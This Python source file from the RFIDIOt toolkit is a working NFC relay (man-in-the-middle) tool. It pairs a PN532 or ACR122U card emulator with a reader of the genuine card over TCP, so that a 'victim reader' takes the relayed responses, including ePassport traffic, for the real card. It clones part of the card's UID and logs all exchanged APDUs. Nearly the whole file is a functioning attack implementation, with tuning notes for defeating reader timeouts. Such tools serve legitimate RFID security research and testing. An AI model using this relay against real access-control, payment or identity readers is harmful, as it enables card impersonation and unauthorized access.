#!/usr/bin/python3
#  pn532mitm.py - NXP PN532 Man-In-The_Middle - log conversations between TAG and external reader
#
#  Adam Laurie <adam@algroup.co.uk>
#  http://rfidiot.org/
#
#  This code is copyright (c) Adam Laurie, 2009, All rights reserved.
#  For non-commercial use only, the following terms apply - for all other
#  uses, please contact the author:
#
#    This code is free software; you can redi!tribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This code is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#


import sys
import os
# import string
import socket
import time
import random
# import operator
import rfidiot
from rfidiot.pn532 import *


# Rendezvous with the remote end. Deterministic roles keep this simple and make
# it work both host-to-host and over loopback (where both ends share a port):
# the side whose remote is the EMULATOR listens, the other connects. (On Python 3
# a single socket can't connect() and then listen() the way 2.7 tolerated, and on
# loopback a symmetric "both bind + both connect" design self-connects - both are
# avoided here.) 'ctype' is the remote's type; the two ends are always opposite.
def connect_to(chost, cport, ctype):
    print("host", chost, "port", cport, "type", ctype)
    if ctype == "EMULATOR":
        # our remote is the emulator, so we are the reader - listen for it
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", cport))
        srv.listen(1)
        print("  Listening on port %s ..." % cport)
        connection, addr = srv.accept()
        srv.close()
        # no Nagle: each relayed APDU is a few small writes, and Nagle + the peer's
        # delayed ACK held some for ~40 ms each way - enough to push a reply past
        # the victim reader's frame waiting time (FWT ~155 ms for the PN532's ATS)
        connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        cdata = recv_data(connection)       # acceptor: receive then send
        send_data(connection, ctype)
        print("  Connected to %s %d" % (addr[0], addr[1]))
    else:
        # our remote is the reader - connect to it (retry until it is listening)
        while True:
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                connection.connect((chost, cport))
                connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                break
            except (ConnectionRefusedError, OSError):
                connection.close()
                print("  Paging %s %s ...          \r" % (chost, cport), end="")
                sys.stdout.flush()
                time.sleep(1)
        send_data(connection, ctype)         # connector: send then receive
        cdata = recv_data(connection)
        print("  Connected to %s %s" % (chost, cport))
    if cdata == ctype:
        print("  Handshake failed - both ends are set to", ctype)
        time.sleep(1)
        connection.close()
        sys.exit(True)
    print("  Remote is", cdata)
    print()
    return connection


# send data with 3 digit length and 2 digit CRC
def send_data(chost, cdata):
    lrc = 0
    length = "%03x" % (len(cdata) + 2)
    for i in length + cdata:
        lrc ^=  ord(i)
        # lrc = operator.xor(lrc, ord(x))
    # one write per message (see TCP_NODELAY in connect_to)
    chost.sendall((length + cdata + "%02x" % lrc).encode("latin-1"))


def _recv(chost, n):
    "read up to n bytes; exit if the remote end has closed the connection"
    chunk = chost.recv(n)
    if not chunk:
        print("  Remote closed the connection")
        chost.close()
        sys.exit(True)
    return chunk.decode("latin-1")


# receive data of specified length and check CRC
def recv_data(chost):
    out = ""
    while len(out) < 3:
        out += _recv(chost, 3 - len(out))
    length = int(out, 16)
    lrc = 0
    for x in out:
        # lrc = operator.xor(lrc, ord(x))
        lrc ^=  ord(x)
    out = ""
    while len(out) < length:
        out += _recv(chost, length - len(out))
    for x in out[:-2]:
        # lrc = operator.xor(lrc, ord(x))
        lrc ^=  ord(x)
    if lrc != int(out[-2:], 16):
        print("  Remote socket CRC failed!")
        chost.close()
        sys.exit(True)
    return out[:-2]


try:
    card = rfidiot.card
except:
    sys.exit(True)

args = rfidiot.args
chelp = rfidiot.help

# Print our own help BEFORE card.info(): under -h, card.info() emits the banner
# and exits (see RFIDIOt.info()), so the detailed help below must come first.
if chelp or len(args) < 1:
    print(sys.argv[0] + " - NXP PN532 Man-In-The-Middle")
    print()
    print("\tUsage: " + sys.argv[0] + " <EMULATOR# | reader:HOST:PORT | emulator:HOST:PORT> [LOG FILE] ['QUIET']")
    print()
    print("\t  A MITM has two roles:")
    print()
    print("\t    READER   - talks to the genuine target (the REAL card / chip).")
    print("\t    EMULATOR - presents a FAKE card over the air to the victim reader.")
    print()
    print("\t  APDUs are relayed EMULATOR <-> READER, so the victim reader believes")
    print("\t  it is talking to the real card.")
    print()
    print("\t  THIS (local) machine always runs exactly ONE of those roles.")
    print("\t  For the socket forms the argument names the REMOTE role (via the")
    print("\t  'reader:'/'emulator:' prefix), so the LOCAL role is the opposite.")
    print("\t  For a bare device number the argument is the local EMULATOR device:")
    print()
    print("\t    <n>                 LOCAL = EMULATOR, on PC/SC reader <n>.")
    print("\t                        READER = the default local PC/SC reader")
    print("\t                        (from config, or -r). Both roles on one host.")
    print()
    print("\t    reader:HOST:PORT    REMOTE (HOST:PORT) = READER.")
    print("\t                        LOCAL = EMULATOR, selected with -r <n> (PC/SC)")
    print("\t                        or -f <n> (libnfc ACR122U / tikitag).")
    print()
    print("\t    emulator:HOST:PORT  REMOTE (HOST:PORT) = EMULATOR.")
    print("\t                        LOCAL = READER: an ACS PC/SC reader (-r <n>), or any")
    print("\t                        reader that sends APDUs (e.g. -R READER_TWN4, -f <n>).")
    print("\t                        The real card may be Type A or B (e.g. a Type B")
    print("\t                        ePassport); the EMULATOR always presents Type A.")
    print()
    print("\t  COMMANDS and RESPONSES are relayed between the READER and the")
    print("\t  EMULATOR, and the relayed traffic is displayed (and logged if")
    print("\t  [LOG FILE] is given). 'QUIET' suppresses the on-screen traffic log.")
    print()
    print("\t  Log format:")
    print()
    print("\t    << DATA...        - HEX APDU received by EMULATOR and relayed to READER")
    print("\t    >> DATA... SW1SW2 - HEX response and STATUS received by READER and relayed to EMULATOR")
    print()
    print("\t  Examples (the role word shows what THIS host does):")
    print()
    print("\t    One host, READER = device 2, EMULATOR = device 3:")
    print("\t      " + sys.argv[0] + " -r 2 3")
    print()
    print("\t    This host EMULATES (PC/SC device 2); READER is on another host:")
    print("\t      " + sys.argv[0] + " -r 2 reader:192.168.1.3:5000")
    print()
    print("\t    This host EMULATES with a libnfc ACR122U/tikitag; READER is remote:")
    print("\t      " + sys.argv[0] + " -f 0 reader:192.168.1.3:5000")
    print()
    print("\t    This host is the READER (default PC/SC); EMULATOR is on another host:")
    print("\t      " + sys.argv[0] + " emulator:192.168.1.3:5000")
    print()
    print("\t    One host, three readers: TWN4 reads the card, ACR122U-WB-R emulates:")
    print("\t      " + sys.argv[0] + " -R READER_TWN4 emulator:127.0.0.1:5000")
    print("\t      " + sys.argv[0] + " -f ccid reader:127.0.0.1:5000")
    print()
    print("\t  Coupling: the EMULATOR couples to the victim target reader only over")
    print("\t  the air, so reliability is antenna coupling, not host count. An")
    print("\t  all-PC/SC run can put all three (READER, EMULATOR, target reader) on")
    print("\t  one host if the target couples well (the OMNIKEY CardMan 5321 couples")
    print("\t  poorly and fails larger transfers; most other PC/SC readers are fine).")
    print()
    print("\t  libnfc EMULATOR: a libnfc ACR122U/tikitag (-f <n>), or an ACR122U over")
    print("\t  direct CCID (-f ccid), can be the local EMULATOR, but ONLY over the socket")
    print("\t  (reader:HOST:PORT) - run the READER as a second process (or on another")
    print("\t  host). It emulates an ISO 14443-4 (Type 4 / APDU) target; the SCL3711")
    print("\t  (PN533) can't be a Type 4 target THIS way (the chip runs T=CL) and is")
    print("\t  refused - use relayuid.py for a PN533, which runs T=CL on the host. An -f ccid emulator")
    print("\t  can't be interrupted while it waits: after Ctrl-C it waits for the victim")
    print("\t  reader to send one more command (a hard kill means replugging it).")
    print()
    sys.exit(True)

card.info("pn532mitm v3.0f")

# logging = False
logfile = None
if len(args) > 1:
    if os.path.isfile(args[1]):
        x = input("  *** Warning! File already exists! Overwrite (y/n)? ").upper()
        if x != "Y":
            sys.exit(True)

    try:
        logfile = open(args[1], "w", encoding="utf-8" )
        # logging = True
    except Exception as _e:
        print("  Couldn't create logfile:", args[1])
        print("  {_e}")
        sys.exit(True)

try:
    if args[2] == "QUIET":
        quiet = True
except:
    quiet = False

if len(args) < 1:
    print("No EMULATOR or REMOTE specified")
    sys.exit(True)

# check if we are using a REMOTE system
remote = ""
remote_type = ""
# if string.find(args[0], "emulator:") == 0:
if args[0].startswith("emulator:"):
    remote = args[0][9:]
    em_remote = True
    remote_type = "EMULATOR"
else:
    em_remote = False

# if string.find(args[0], "reader:") == 0
if args[0].startswith("reader:"):
    remote = args[0][7:]
    rd_remote = True
    remote_type = "READER"
    emulator = card
else:
    rd_remote = False


if remote:
    host = remote[: remote.find(":")]
    port = int(remote[remote.find(":") + 1 :])
    connection = connect_to(host, port, remote_type)
else:
    try:
        readernum = int(args[0])
        emulator = rfidiot.RFIDIOt.rfidiot(readernum, card.readertype, "", "", "", "", "", "")
        print("  Emulator:", end="")
        emulator.info("")
        if emulator.readersubtype != card.READER_ACS:
            print("EMULATOR is not an ACS")
            sys.exit(True)
    except:
        print("Couldn't initialise EMULATOR on reader", args[0])
        sys.exit(True)

# The EMULATOR side may be a libnfc reader (e.g. an ACR122U/tikitag driven via
# -f): it presents a target to the victim reader using the pynfc target-mode
# helpers and relays each APDU over the socket. We synthesize the same ACS PN532
# response framing on the wire ("D503..", "D58D..", "D587..") so the READER side
# - which stays the existing PC/SC code, possibly on another machine - is
# unchanged. Only the emulator-over-socket case (reader:HOST:PORT) is supported
# for libnfc; the READER side (which drives the real tag) still needs ACS, and a
# local all-in-one run still needs ACS for both.
em_libnfc = rd_remote and card.readertype == card.READER_LIBNFC
em_pending = None  # first APDU captured during libnfc activation, if any

# The READER side may be any reader that sends APDUs (TWN4, libnfc, Chameleon,
# PC/SC) when the EMULATOR is remote (emulator:HOST:PORT): it only selects the
# real card and relays APDUs, so no PN532 is needed there. We synthesize the
# PN532 replies the EMULATOR side expects (firmware, status) and relay with the
# ordinary send_apdu(). The source card may be Type A or Type B (e.g. a Type B
# ePassport); the emulator always presents Type A.
rd_generic = em_remote and card.readersubtype != card.READER_ACS

# always check at least one device locally
if not em_libnfc and not rd_generic and card.readersubtype != card.READER_ACS:
    print("Local reader is not an ACS")
    if remote:
        connection.close()
    sys.exit(True)

if em_libnfc:
    # No PN532 GetFirmwareVersion over libnfc; send a synthetic response so the
    # remote READER side's handshake (which prints it) still completes.
    fwdata = "D50332010607"
    send_data(connection, fwdata)
    print("  Local firmware (libnfc emulator - synthetic):")
    pn532_print_firmware(fwdata)
elif rd_generic:
    fwdata = "D50332010607"
    send_data(connection, fwdata)
    print("  Local firmware (non-PN532 READER - synthetic):")
    pn532_print_firmware(fwdata)
elif card.acs_send_apdu(PN532_APDU["GET_PN532_FIRMWARE"]):
    if remote:
        send_data(connection, card.data)
        print("  Local NXP PN532 Firmware:")
    else:
        print("  Reader NXP PN532 Firmware:")
    if card.data[:4] != PN532_OK:
        print("  Bad data from PN532:", card.data)
        if remote:
            connection.close()
        sys.exit(True)
    else:
        pn532_print_firmware(card.data)

if remote:
    data = recv_data(connection)
    print("  Remote NXP PN532 Firmware:")
else:
    if emulator.acs_send_apdu(PN532_APDU["GET_PN532_FIRMWARE"]):
        data = card.data
    emulator.acs_send_apdu(card.PCSC_APDU["ACS_LED_ORANGE"])
    print("  Emulator NXP PN532 Firmware:")

if data[:4] != PN532_OK:
    print("  Bad data from PN532:", data)
    if remote:
        connection.close()
    sys.exit(True)
else:
    pn532_print_firmware(data)

if rd_generic:
    print("  Waiting for source TAG...", end=" ", flush=True)
    while not (card.select("A") or card.select("B")):
        time.sleep(0.1)
    print(card.tagtype)
    full_uid = card.uid
    # a Type B source has no ATQA/SAK: present it as a Type A ISO 14443-4 card
    sens_res = [card.sens_res or "0004"]
    sel_res = [card.sel_res or "20"]
elif not remote or remote_type == "EMULATOR":
    card.waitfortag("  Waiting for source TAG...")
    full_uid = card.uid
    sens_res = [card.sens_res]
    sel_res = [card.sel_res]
if remote:
    if remote_type == "READER":
        print("  Waiting for remote TAG...")
        connection.settimeout(None)
        full_uid = recv_data(connection)
        sens_res = [recv_data(connection)]
        sel_res = [recv_data(connection)]
    else:
        send_data(connection, full_uid)
        send_data(connection, sens_res[0])
        send_data(connection, sel_res[0])

# TgInitAsTarget mode (bitfield): 00=any, 01=passive, 02=DEP, 04=PICC-only.
# A plain reader (e.g. OMNIKEY) activates the emulator as an ISO/IEC 14443-4 PICC
# with mode 00. NB: a PN53x initiator (SCL3711/PN533) negotiates NFC-DEP with a
# PN532 emulator and fails ("DEP protocol - invalid device state") for modes
# 00/01, and the ACR122U firmware rejects PICC-only (04) with 637F - so an
# ACR122U emulator can't currently be read by a PN53x; use a non-NXP reader.
mode = ["00"]
print("         UID:", full_uid)
# TgInitAsTarget only carries a 3-byte NFCID1t, and in target mode the PN532
# always emits a single-size (4-byte) UID whose first byte is hard-wired to 0x08
# (the ISO/IEC 14443-3 cascade-tag / random-UID marker). So we can only clone the
# low 3 bytes of the source UID here; byte 0 comes out 0x08 no matter what we pass,
# which is why it is stripped. This is exact for ICAO 9303 ePassports (their UIDs
# are random and already start with 0x08) but will not reproduce a fixed non-0x08
# first byte (e.g. a real MIFARE manufacturer byte) - the PN532 cannot do that;
# an arbitrary byte 0 needs a different emulator (Proxmark3, Chameleon).
uid = [full_uid[2:]]
print("    sens_res:", sens_res[0])
print("     sel_res:", sel_res[0])
print()
felica = ["01fea2a3a4a5a6a7c0c1c2c3c4c5c6c7ffff"]
nfcid = ["aa998877665544332211"]
try:
    lengt = ["%02x" % (len(args[6]) // 2)]
    gt = [args[6]]
except:
    lengt = ["00"]
    gt = [""]
try:
    lentk = ["%02x" % (len(args[7]) // 2)]
    tk = [args[7]]
except:
    lentk = ["00"]
    tk = [""]

if rd_generic:
    # one 106 kbps ISO 14443-A target, no error, no external field
    data = "D505000001000000" + "00" + "00"
elif not remote or remote_type == "EMULATOR":
    if card.acs_send_apdu(PN532_APDU["GET_GENERAL_STATUS"]):
        data = card.data
if remote:
    if remote_type == "EMULATOR":
        send_data(connection, data)
    else:
        data = recv_data(connection)

tags = pn532_print_status(data)
if tags > 1:
    print("  Too many TAGS to EMULATE!")
    if remote:
        connection.close()
    sys.exit(True)

# emulator.acs_send_apdu(emulator.PCSC_APDU['ACS_SET_PARAMETERS']+['14'])

if not remote or remote_type == "READER":
    print("  Waiting for EMULATOR activation...")
    if em_libnfc:
        # Present an ISO 14443-4 PICC via libnfc target mode (easy framing on,
        # so the victim reader's chip drives T=CL and we trade bare APDUs). The
        # UID/sens_res/sel_res are the real tag's, relayed from the READER side.
        target = emulator.nfc.make_iso14443a_target(
            sens_res[0], "08" + uid[0], sel_res[0], tk[0])
        ok, first = emulator.nfc.initAsTarget(target, 0, raw=False)
        if not ok:
            print("Target Init failed (libnfc rc %s)" % first)
            if remote:
                connection.close()
            sys.exit(True)
        if first[:2] == "E0":
            print("Reader handed up the RATS (%s): this chip won't run T=CL in "
                  "easy-framing target mode (PN533/SCL3711). Use an ACR122U/PN532 "
                  "as the emulator here, or relayuid.py (host-side T=CL) for a PN533." % first)
            if remote:
                connection.close()
            sys.exit(True)
        em_pending = first  # '' if the chip answered RATS and no APDU yet
        # Synthesize the ACS TgInitAsTarget result for the wire/parse below:
        # 'D58D' + mode byte 0x08 (ISO 14443-4 PICC), no initiator bytes.
        data = "D58D08"
    else:
        status = emulator.acs_send_apdu(
            PN532_APDU["TG_INIT_AS_TARGET"] + mode + sens_res + uid + sel_res + felica + nfcid + lengt + gt + lentk + tk
        )
        if not status or emulator.data[:4] != "D58D":
            print(
                "Target Init failed:",
                emulator.errorcode,
                emulator.get_error_str(card.errorcode),
            )
            if remote:
                connection.close()
            sys.exit(True)
        data = emulator.data
if remote:
    if remote_type == "READER":
        send_data(connection, data)
    else:
        print("  Waiting for remote EMULATOR activation...")
        connection.settimeout(None)
        data = recv_data(connection)

mode = int(data[4:6], 16)
baudrate = mode & 0x70
print("  Emulator activated:")
print("         UID: 08%s" % uid[0])
print("    Baudrate:", PN532_BAUDRATES[baudrate])
print("        Mode:", end="")
if mode & 0x08:
    print("ISO/IEC 14443-4 PICC")
if mode & 0x04:
    print("DEP")
framing = mode & 0x03
print("     Framing:", PN532_FRAMING[framing])
initiator = data[6:]
print("   Initiator:", initiator)
print()

print("  Waiting for APDU...")
started = False
try:
    while 42:
        # wait for emulator to receive a command
        if not remote or remote_type == "READER":
            if em_libnfc:
                if em_pending:
                    apdu, em_pending = em_pending, None
                    ok = True
                else:
                    em_pending = None  # drop the '' sentinel after activation
                    ok, apdu = emulator.nfc.targetReceive(0)
                if ok:
                    # mimic the ACS TgGetData reply: 'D587' + errorcode 00 + APDU
                    data = "D58700" + apdu
                else:
                    # negative rc (field gone / released): map to the ACS
                    # "released" status 0x29 so the end handling below fires.
                    data = "D58729"
            else:
                status = emulator.acs_send_apdu(PN532_APDU["TG_GET_DATA"])
                data = emulator.data
                # if not status or not emulator.data[:4] == 'D587':
                if not status:
                    print(
                        "Target Get Data failed:",
                        emulator.errorcode,
                        emulator.get_error_str(card.errorcode),
                    )
                    print("Data:", emulator.data)
                    if remote:
                        connection.close()
                    sys.exit(True)
        if remote:
            if remote_type == "READER":
                send_data(connection, data)
            else:
                connection.settimeout(None)
                data = recv_data(connection)
        errorcode = int(data[4:6], 16)
        if errorcode != 0x00:
            if remote:
                connection.close()
            if errorcode == 0x29:
                if logfile:
                    logfile.close()
                    logfile = None
                print("  Session ended: EMULATOR released by Initiator")
                if (not remote or remote_type == "READER") and not em_libnfc:
                    emulator.acs_send_apdu(card.PCSC_APDU["ACS_LED_GREEN"])
                sys.exit(False)
            print("Error:", PN532_ERRORS[errorcode])
            sys.exit(True)
        if not quiet:
            print("<<", data[6:])
        else:
            if not started:
                print("  Logging started...")
                started = True
        if logfile:
            logfile.write("<< %s\n" % data[6:])
            logfile.flush()
        # relay command to tag
        if rd_generic:
            apdu = data[6:]
            card.send_apdu("", "", "", "", apdu[0:2], apdu[2:4], apdu[4:6], apdu[6:8], "", apdu[8:], "")
            data = card.data
            errorcode = card.errorcode
        elif not remote or remote_type == "EMULATOR":
            status = card.acs_send_direct_apdu(data[6:])
            data = card.data
            errorcode = card.errorcode
        if remote:
            if remote_type == "EMULATOR":
                send_data(connection, data)
                send_data(connection, errorcode)
            else:
                data = recv_data(connection)
                errorcode = recv_data(connection)
        if not quiet:
            print(">>", data, errorcode)
        if logfile:
            logfile.write(">> %s %s\n" % (data, errorcode))
            logfile.flush
        # relay tag's response back via emulator
        if not remote or remote_type == "READER":
            if em_libnfc:
                # send the tag's response body + status word to the victim reader
                emulator.nfc.targetSend(data + errorcode, 0)
            else:
                status = emulator.acs_send_apdu(PN532_APDU["TG_SET_DATA"] + [data] + [errorcode])
except Exception:
    # NB: catch only real errors - a bare 'except:' also swallows the SystemExit
    # from the clean "EMULATOR released by Initiator" (0x29) exit above, turning a
    # normal session-end into a spurious error.
    if logfile:
        logfile.close()
        logfile = None
    print("  Session ended with possible errors")
    if remote:
        connection.close()
    if (not remote or remote_type == "READER") and not em_libnfc:
        emulator.acs_send_apdu(card.PCSC_APDU["ACS_LED_GREEN"])
    sys.exit(True)
